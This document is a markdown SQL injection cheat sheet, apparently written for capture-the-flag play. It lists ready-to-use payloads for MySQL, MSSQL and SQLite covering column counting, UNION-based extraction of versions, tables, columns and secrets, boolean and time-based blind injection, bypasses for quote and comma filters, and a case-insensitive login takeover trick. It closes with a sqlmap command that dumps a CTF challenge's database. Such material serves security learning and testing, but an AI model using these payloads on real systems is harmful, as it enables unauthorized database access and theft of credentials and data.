###### In the following queries, `'` may not work sometimes, so { **\`**,`"` } can  be tested
###### To comment out the remaining code, { `;#`,`;--`,`;//` } can be used
###### While doing sqli through urls, { `;#`,`;--`,`;//` } need to be encoded specially 

### Finding no of columns in table _(Error-based SQLI)_
  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
  
* _[$input_user]_ : `' UNION SELECT 1,2,3.. FROM table_name --`
* _[$input_user]_ : `' ORDER BY n --`  [If we get error for n, then n-1 will be no of columns]
 
### Limiting no of rows
  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
  
* _[$input_user]_ : `' OR 1=1 LIMIT 1 --`

## For Mysql
  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
###### Assume no of columns to be 3
#### Finding version and databases
*  _[$input_user]_ : `' UNION SELECT 1,@@version,database() --`

#### Extracting Tables from databases
*  _[$input_user]_ : `' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()`

#### Extracting columns from databases
*  _[$input_user]_ : `' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database()`
*  _[$input_user]_ : `' UNION SELECT table_name, column_name, 1 FROM information_schema.columns`

### Fetching a particular column without knowing column's name
* `SELECT F.4 FROM (SELECT 1, 2, 3, 4 UNION SELECT * FROM users)F;` will fetch 4th column of `users`.

  It works because the column names of the table derived from the subselect are the values of the leftmost `SELECT`
## For Mssql
  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
###### Assume no of columns to be 3
#### Finding version and databases
*  _[$input_user]_ : `' UNION SELECT 1,@@version,db_name(i) --` [Here **i** is the i-th database present]
*  _[$input_user]_ : `' UNION SELECT 1,@@version,name FROM master..sysdatabases --`

__[In MsSQL, if second colums is `username` then the payload `' UNION SELECT 1,1,name FROM master..sysdatabases --` won't work , second column MUST be a string. Interesting !!]__

## For sqlite
 In sqlite __sqlite_master__ replaces __information_schema__
 
  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
#### Extracting sqlite version
  _[$input_user]_ : `' UNION SELECT sqlite_version()`
#### Extracting table names
  _[$input_user]_ : `' UNION SELECT name FROM sqlite_master WHERE type='table'`
#### Extracting column names from a table
  _[$input_user]_ : `' UNION SELECT sql FROM sqlite_master WHERE type='table' AND tbl_name = 'table_name'`

## Blind SQLI
  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
  
*  _[$input_user]_ : `' WHERE EXISTS(SELECT * FROM table_name WHERE username LIKE "%a%") --`   [It will ask whether a user with letter "a" or "A" containing in his name]
*  _[$input_user]_ : `' WHERE EXISTS(SELECT * FROM table_name WHERE username LIKE "__a%") --`	 [It will ask whether the letter is at 3rd place or NOT]

  HERE `%`,`_` are WILDCARDS. `%` matches any string and `_` matches only one character

* By default, LIKE is __case-insensitive__

  _[$input_user]_ : `' WHERE EXISTS(SELECT * FROM table_name WHERE username LIKE BINARY "%a%") --` [To make a case sensitive search, use BINARY right after LIKE]

## Time-based Blind SQLI
  _[Vulnearable code]_ : `SELECT * FROM table_name WHERE username='$input_user' AND pass='$input_pass'`
#### MySQLI
*  _[$input_user]_ : `' OR (SELECT SLEEP(10) FROM table_name WHERE username='something') --`
*  _[$input_user]_ : `' OR IF(username='something',SLEEP(10),0) --`

    [Produces a delayed response if username=`something` exists]
#### SQLite
* _[$input_user]_ : `' OR CONDITION='true' AND 1=randomblob(100000000) --`

    [Produces a delayed response if CONDITION='true']

## Bypassing BLACKLISTED CHARS
* `,` using `JOIN`

  `SELECT 1,2,3 FROM users` : `SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c`

* Bypassing filtered `'`__[quote]__ (special case)

```   
 <?php 
 $name = preg_replace("'","",$name);
 $pass = preg_replace("'","",$pass);
 SELECT * FROM users WHERE username='name' and password='pass'
```
  _[attack]_ => user = `\`  & pass = `OR 1=1 --`

## Common-errs
* `mysql` does a case insensitive search by default and also ignores the trailing spaces

   How to exploit that?
   
   A username `Admin` can be created and it can be used to sign-in as `admin`

## Unique-injection
*
   ```
    '||(select tbl_name FROM sqlite_master)||'
    '||(select sql FROM sqlite_master)||'
    '||(select secret FROM user WHERE id =1)||'
   ```

## SqlMap Command
* ```
  python sqlmap.py -u "http://ctf.sharif.edu:35455/chal/hackme/677aa21d5725bb62/login.php" --csrf-token="user_token" --csrf-url="http://ctf.sharif.edu:35455/chal/hackme/677aa21d5725bb62/" --data="username=a&password=a&Login=Login&user_token=" --dump
  ```

